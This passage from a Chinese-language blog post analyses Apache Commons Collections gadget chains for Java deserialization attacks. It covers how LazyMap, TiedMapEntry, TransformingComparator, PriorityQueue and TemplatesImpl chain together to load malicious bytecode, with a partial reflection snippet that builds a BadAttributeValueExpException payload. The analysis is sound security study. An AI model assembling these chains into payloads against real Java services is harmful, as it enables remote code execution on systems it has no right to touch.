class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过decorate方法返回LazyMap实例。</p><p>LazyMap.get()方法调用了<code>this.factory.transform(key)</code></p><p>当我们把this.factory指向<code>ChainedTransformer</code>的时候，就能完成攻击链调用。</p><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>org.apache.commons.collections.keyvalue.TiedMapEntry</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Entry</span>, KeyValue, Serializable </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//调用了this.getValue()-&gt;this.map.get</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Entry)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">other</span> <span class="operator">=</span> (Entry)obj;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">this</span>.key == <span class="literal">null</span> ? other.getKey() == <span class="literal">null</span> : <span class="built_in">this</span>.key.equals(other.getKey())) &amp;&amp; (value == <span class="literal">null</span> ? other.getValue() == <span class="literal">null</span> : value.equals(other.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//调用了this.getValue()-&gt;this.map.get</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//调用了this.getValue()-&gt;this.map.get</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三个方法都可以调用到this.map.get，如果我们将this.map指向LazyMap即可完成调用链</p><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(<span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer,</span></span><br><span class="line"><span class="params">                                  <span class="keyword">final</span> Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">        <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// compare函数，无判断条件直接调用transform</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当然他是一个比较器，当我们能触发他的compare方法就可以完成transform调用</p><p>在CC2中，他也是被作为一个比较器放在优先队列的构造方法里的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br></pre></td></tr></table></figure><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>java.util.PriorityQueue</p><p>构造方法之一：</p><p>可以自定义它的比较器，一般就是上一个<code>TransformingComparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                     Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">    <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">    <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">    <span class="built_in">this</span>.queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">    <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>readObject方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">        s.readInt();</span><br><span class="line"></span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">        <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里经过一系列内部调用</p><p><code>readObject&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator-&gt;comparator.compare(x, e)-&gt;TransformingComparator.compare(e)-&gt;transformer.transform(e))</code></p><p>一般最后会调用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类来执行恶意代码</p><p>详细见CC2中的分析</p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p><p>ysoserial中最最常见：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure><p>关注其中的几个核心方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 核心方法1 newTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">                                      _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第六行的getTransletInstance()，跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//核心方法2 getTransletInstance</span></span><br><span class="line">    <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>当<code>_name</code>和<code>_class</code>都为null的时候，调用用defineTransletClasses()，然后实例化一个新对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 核心方法3，defineTransletClasses，根据字节码，创建类对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123; <span class="comment">// 这里如果_bytecodes==null，程序直接报错，所以不能为null</span></span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取classLoader，用于后面加载类的字节码</span></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)  AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建常量</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            <span class="comment">// 循环使用defineClass加载类字节码，返回类对象</span></span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="comment">// 省略后的代码，后面基本不用看了，因为没有对__class数组产生影响，返回前面的getTransletInstance函数中        </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>() &#123; <span class="comment">//异常处理，省略 &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过defineClass可以加载我们的恶意字节码！</p><p>关于这个类可以说的很多，详细见之前的分析。</p><h1 id="枪口——实现readObject方法的类"><a href="#枪口——实现readObject方法的类" class="headerlink" title="枪口——实现readObject方法的类"></a>枪口——实现readObject方法的类</h1><h2 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h2><p>javax.management.BadAttributeValueExpException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>val = valObj.toString();</code>中调用了toString方法。</p><p>我们将valObj指向TiedMapEntry即可完成调用。valObj也就是val这个成员变量，因此可以这样构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 省略chainedTransformer创建的过程，直接从前面拿过来就可以了</span></span><br><span class="line">HashMap&lt;String, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">expException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">// 反射修改val</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> expException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    val.set(expException, tiedMapEntry);</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;e.printStackTrace();&#125;</span><br></pre></td></tr></table></figure><h2 id="PriorityQueue-1"><a href="#PriorityQueue-1" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>java.util.PriorityQueue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">        s.readInt();</span><br><span class="line"></span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">        <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面分析过，heapify方法会连接起后面的调用链</p><p>CC2中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readObject&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator-&gt;comparator.compare(x, e)-&gt;</span><br><span class="line">TransformingComparator.compare(e)-&gt;transformer.transform(e))-&gt;invokerTransformer.transform(e)-&gt;</span><br><span class="line">TemplatesImpl.newTransform-&gt;TemplatesImpl.getTransletInstance-&gt;_class[_transletIndex].newInstance()</span><br></pre></td></tr></table></figure><p>如果想用transformerMap只需要把transformer处改成ChainedTransformer的实例即可</p><p>即替换掉上面的第三行即可</p><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                           loadFactor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set other fields that need values</span></span><br><span class="line">    table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in number of buckets</span></span><br><span class="line">    s.readInt(); <span class="comment">// ignored.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read number of mappings</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                           mappings);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// capacity chosen by number of mappings and desired load (if &gt;= 0.25)</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> (<span class="type">int</span>) Math.min(</span><br><span class="line">                mappings * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                <span class="comment">// we have limits...</span></span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate the bucket array;</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        inflateTable(capacity);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        threshold = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init();  <span class="comment">// Give subclass a chance to do its thing.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">        putForCreate(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进：putForCreate方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">putForCreate</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="literal">null</span> == key ? <span class="number">0</span> : hash(key);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span 